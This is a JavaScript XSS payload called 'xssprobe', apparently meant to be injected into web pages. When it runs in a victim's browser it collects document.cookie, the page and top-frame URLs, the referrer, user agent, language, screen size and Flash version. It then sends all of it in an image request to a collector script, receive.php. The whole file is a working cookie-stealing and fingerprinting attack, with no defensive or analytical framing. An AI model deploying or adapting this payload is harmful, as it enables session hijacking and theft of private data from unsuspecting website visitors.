/*
xssprobe
by evilcos@gmail.com | @xeyeteam
*/

// 获取隐私信息的服务端页面
http_server = "http://127.0.0.1/xss/receive.php";

var info = {}; // 隐私信息字典
info.browser = function(){
    ua = navigator.userAgent.toLowerCase();
    var rwebkit = /(webkit)[ \/]([\w.]+)/;
    var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
    var rmsie = /(msie) ([\w.]+)/;
    var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
    var match = rwebkit.exec( ua ) ||
        ropera.exec( ua ) ||
        rmsie.exec( ua ) ||
        ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
        [];
    return "name: "+match[1]+",version: "+match[2]
}();
info.ua = escape(navigator.userAgent);
info.lang = navigator.language;
info.referer = escape(document.referrer);
info.location = escape(window.location.href);
info.toplocation = escape(top.location.href);
info.cookie = escape(document.cookie);
info.domain = document.domain;
info.title = document.title;
info.screen = function(){
    var c = "";
    if (self.screen) {c = screen.width+"x"+screen.height;}
    return c;
}();
info.flash = function(){
    var f="",n=navigator;
    if (n.plugins && n.plugins.length) {
        for (var ii=0;ii<n.plugins.length;ii++) {
            if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {
                f=n.plugins[ii].description.split('Shockwave Flash ')[1];
                break;
            }
        }
    } else if (window.ActiveXObject) {
        for (var ii=20;ii>=2;ii--) {
            try {
                var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
                if (fl) {
                    f=ii + '.0';
                    break;
                }
            }
            catch(e) {}
        }
    }
    return f;
}(); 

function link(info) {
    var data = '',
    data = 'screen='+info.screen+
            '&flash='+info.flash+
            '&browser='+info.browser+
            '&ua='+info.ua+
            '&domain='+info.domain+
            '&title='+info.title+
            '&lang='+info.lang+
            '&referer='+info.referer+
            '&location='+info.location+
            '&toplocation='+info.toplocation+
            '&cookie='+info.cookie;
    return data;
}

function send(){
    var str = link(info);
    new Image().src = http_server + '?' + str;
}
setTimeout(send(),3000);
